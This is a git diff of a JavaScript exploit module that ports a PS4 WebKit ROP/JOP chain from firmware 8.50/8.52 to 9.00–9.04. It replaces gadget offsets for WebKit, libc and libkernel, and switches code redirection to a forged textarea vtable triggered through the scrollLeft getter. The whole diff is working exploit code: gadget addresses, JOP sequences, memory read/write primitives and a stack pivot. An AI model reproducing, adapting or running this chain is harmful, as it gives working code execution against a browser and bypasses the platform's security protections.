@@ -15,11 +15,12 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-// 8.50, 8.52
+// 9.00, 9.03, 9.04
+// ROP Chain by @janisslsm
 
 import { mem } from "../../module/mem.mjs";
 import { KB } from "../../module/offset.mjs";
-import { ChainBase, get_gadget } from "../../module/chain.mjs";
+import { ChainBase } from "../../module/chain.mjs";
 import { BufferView } from "../../module/rw.mjs";
 
 import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";
@@ -27,8 +28,8 @@ import { get_view_vector, resolve_import, init_syscall_array } from "../../modul
 import * as off from "../../module/offset.mjs";
 
 // WebKit offsets of imported functions
-const offset_wk_stack_chk_fail = 0x8d8;
-const offset_wk_strlen = 0x918;
+const offset_wk_stack_chk_fail = 0x178;
+const offset_wk_strlen = 0x198;
 
 // libSceNKWebKit.sprx
 export let libwebkit_base = null;
@@ -39,31 +40,48 @@ export let libc_base = null;
 
 // gadgets for the JOP chain
 //
-// we'll use JSC::CustomGetterSetter.m_setter to redirect execution. its
-// type is PutPropertySlot::PutValueFunc
+// When the scrollLeft getter native function is called on the console, rsi is
+// the JS wrapper for the WebCore textarea class.
 const jop1 = `
-mov rdi, qword ptr [rsi + 8]
+mov rdi, qword ptr [rsi + 0x18]
 mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 0x70]
+call qword ptr [rax + 0xb8]
+`;
+// Since the method of code redirection we used is via redirecting a call to
+// jump to our JOP chain, we have the return address of the caller on entry.
+//
+// jop1 pushed another object (via the call instruction) but we want no
+// extra objects between the return address and the rbp that will be pushed by
+// jop2 later. So we pop the return address pushed by jop1.
+//
+// This will make pivoting back easy, just "leave; ret".
+const jop2 = `
+pop rsi
+jmp qword ptr [rax + 0x1c]
+`;
+const jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x30]
 `;
 // rbp is now pushed, any extra objects pushed by the call instructions can be
 // ignored
-const jop2 = `
+const jop4 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x30]
+call qword ptr [rax + 0x58]
 `;
-const jop3 = `
-mov rdx, qword ptr [rdx + 0x50]
-mov ecx, 0xa
-call qword ptr [rax + 0x40]
+const jop5 = `
+mov rdx, qword ptr [rax + 0x18]
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0x10]
 `;
-const jop4 = `
+const jop6 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop5 = "pop rsp; ret";
+const jop7 = "pop rsp; ret";
 
 // the ps4 firmware is compiled to use rbp as a frame pointer
 //
@@ -80,53 +98,56 @@ const jop5 = "pop rsp; ret";
 
 const webkit_gadget_offsets = new Map(
   Object.entries({
-    "pop rax; ret": 0x000000000001ac7b, // `58 c3`
-    "pop rbx; ret": 0x000000000000c46d, // `5b c3`
-    "pop rcx; ret": 0x000000000001ac5f, // `59 c3`
-    "pop rdx; ret": 0x0000000000282ea2, // `5a c3`
+    "pop rax; ret": 0x0000000000051a12, // `58 c3`
+    "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
+    "pop rcx; ret": 0x00000000000657b7, // `59 c3`
+    "pop rdx; ret": 0x000000000000986c, // `5a c3`
 
     "pop rbp; ret": 0x00000000000000b6, // `5d c3`
-    "pop rsi; ret": 0x0000000000050878, // `5e c3`
-    "pop rdi; ret": 0x0000000000091afa, // `5f c3`
-    "pop rsp; ret": 0x0000000000073c2b, // `5c c3`
+    "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
+    "pop rdi; ret": 0x0000000000319690, // `5f c3`
+    "pop rsp; ret": 0x000000000004e293, // `5c c3`
 
-    "pop r8; ret": 0x000000000003b4b3, // `47 58 c3`
-    "pop r9; ret": 0x00000000010f372f, // `47 59 c3`
-    "pop r10; ret": 0x0000000000b1a721, // `47 5a c3`
-    "pop r11; ret": 0x0000000000eaba69, // `4f 5b c3`
+    "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
+    "pop r9; ret": 0x0000000000422571, // `47 59 c3`
+    "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
+    "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
 
-    "pop r12; ret": 0x0000000000eaf80d, // `47 5c c3`
-    "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
-    "pop r14; ret": 0x0000000000050877, // `41 5e c3`
-    "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
+    "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
+    "pop r13; ret": 0x00000000001da461, // `47 5d c3`
+    "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
+    "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
 
     "ret": 0x0000000000000032, // `c3`
-    "leave; ret": 0x000000000001ba53, // `c9 c3`
+    "leave; ret": 0x000000000008db5b, // `c9 c3`
 
-    "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
-    "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
-    "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
-    "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
+    "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
+    "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
+    "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
+    "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
 
-    [jop1]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
-    [jop2]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
-    [jop3]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
-    [jop4]: 0x00000000021f3a2e, // `52 ff 20`
-    [jop5]: 0x0000000000073c2b, // `5c c3`
+    [jop1]: 0x00000000004e62a4, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
+    [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
+    [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`
+
+    [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
+    [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
+    [jop6]: 0x00000000028bd332, // `52 ff 20`
+    [jop7]: 0x000000000004e293, // `5c c3`
   }),
 );
 
 const libc_gadget_offsets = new Map(
   Object.entries({
-    "getcontext": 0x25904,
-    "setcontext": 0x29c38,
+    "getcontext": 0x24f04,
+    "setcontext": 0x29448,
   }),
 );
 
 const libkernel_gadget_offsets = new Map(
   Object.entries({
     // returns the location of errno
-    "__error": 0x10750,
+    "__error": 0xcb80,
   }),
 );
 
@@ -136,17 +157,17 @@ function get_bases() {
   const textarea = document.createElement("textarea");
   const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
   const textarea_vtable = webcore_textarea.readp(0);
-  const off_ta_vt = 0x236d4a0;
+  const off_ta_vt = 0x2e73c18;
   const libwebkit_base = textarea_vtable.sub(off_ta_vt);
 
   const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
   const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
-  const off_scf = 0x153c0;
+  const off_scf = 0x1ff60;
   const libkernel_base = stack_chk_fail_addr.sub(off_scf);
 
   const strlen_import = libwebkit_base.add(offset_wk_strlen);
   const strlen_addr = resolve_import(strlen_import);
-  const off_strlen = 0x4ef40;
+  const off_strlen = 0x4fa40;
   const libc_base = strlen_addr.sub(off_strlen);
 
   return [libwebkit_base, libkernel_base, libc_base];
@@ -158,7 +179,7 @@ export function init_gadget_map(gadget_map, offset_map, base_addr) {
   }
 }
 
-class Chain850Base extends ChainBase {
+class Chain900Base extends ChainBase {
   push_end() {
     this.push_gadget("leave; ret");
   }
@@ -187,23 +208,62 @@ class Chain850Base extends ChainBase {
   }
 }
 
-export class Chain850 extends Chain850Base {
+export class Chain900 extends Chain900Base {
   constructor() {
     super();
-    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
-    rdx.write64(off.js_cell, this._empty_cell);
-    rdx.write64(0x50, this.stack_addr);
-    this._rsp = mem.fakeobj(rdx);
+
+    const textarea = document.createElement("textarea");
+    this._textarea = textarea;
+    const js_ta = mem.addrof(textarea);
+    const webcore_ta = js_ta.readp(0x18);
+    this._webcore_ta = webcore_ta;
+    // Only offset 0x1c8 will be used when calling the scrollLeft getter
+    // native function (our tests don't crash).
+    //
+    // This implies we don't need to know the exact size of the vtable and
+    // try to copy it as much as possible to avoid a crash due to missing
+    // vtable entries.
+    //
+    // So the rest of the vtable are free for our use.
+    const vtable = new BufferView(0x200);
+    const old_vtable_p = webcore_ta.readp(0);
+    this._vtable = vtable;
+    this._old_vtable_p = old_vtable_p;
+
+    // 0x1b8 is the offset of the scrollLeft getter native function
+    vtable.write64(0x1b8, this.get_gadget(jop1));
+    vtable.write64(0xb8, this.get_gadget(jop2));
+    vtable.write64(0x1c, this.get_gadget(jop3));
+
+    // for the JOP chain
+    const rax_ptrs = new BufferView(0x100);
+    const rax_ptrs_p = get_view_vector(rax_ptrs);
+
+    rax_ptrs.write64(0x30, this.get_gadget(jop4));
+    rax_ptrs.write64(0x58, this.get_gadget(jop5));
+    rax_ptrs.write64(0x10, this.get_gadget(jop6));
+    rax_ptrs.write64(0, this.get_gadget(jop7));
+    // value to pivot rsp to
+    rax_ptrs.write64(0x18, this.stack_addr);
+
+    const jop_buffer = new BufferView(8);
+    const jop_buffer_p = get_view_vector(jop_buffer);
+
+    jop_buffer.write64(0, rax_ptrs_p);
+
+    vtable.write64(8, jop_buffer_p);
   }
 
   run() {
     this.check_allow_run();
-    this._rop.launch = this._rsp;
+    this._webcore_ta.write64(0, get_view_vector(this._vtable));
+    this._textarea.scrollLeft;
+    this._webcore_ta.write64(0, this._old_vtable_p);
     this.dirty();
   }
 }
 
-export const Chain = Chain850;
+export const Chain = Chain900;
 
 export function init(Chain) {
   const syscall_array = [];
@@ -213,51 +273,6 @@ export function init(Chain) {
   init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
   init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
   init_syscall_array(syscall_array, libkernel_base, 300 * KB);
-
-  let gs = Object.getOwnPropertyDescriptor(window, "location").set;
-  // JSCustomGetterSetter.m_getterSetter
-  gs = mem.addrof(gs).readp(0x28);
-
-  // sizeof JSC::CustomGetterSetter
-  const size_cgs = 0x18;
-  const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
-  mem.cpy(gc_buf, gs, size_cgs);
-  // JSC::CustomGetterSetter.m_setter
-  gc_buf.write64(0x10, get_gadget(gadgets, jop1));
-
-  const proto = Chain.prototype;
-  // _rop must have a descriptor initially in order for the structure to pass
-  // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
-  // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
-  // checks for any descriptor to run
-  //
-  // the butterfly's indexing type must be something the GC won't inspect
-  // like DoubleShape. it will be used to store the JOP table's pointer
-  const _rop = {
-    get launch() {
-      throw Error("never call");
-    },
-    0: 1.1,
-  };
-  // replace .launch with the actual custom getter/setter
-  mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
-  proto._rop = _rop;
-
-  // JOP table
-  const rax_ptrs = new BufferView(0x100);
-  const rax_ptrs_p = get_view_vector(rax_ptrs);
-  proto._rax_ptrs = rax_ptrs;
-
-  rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
-  rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
-  rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
-  rax_ptrs.write64(0, get_gadget(gadgets, jop5));
-
-  const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
-  jop_buffer_p.write64(0, rax_ptrs_p);
-
-  const empty = {};
-  proto._empty_cell = mem.addrof(empty).read64(off.js_cell);
 
   Chain.init_class(gadgets, syscall_array);
 }
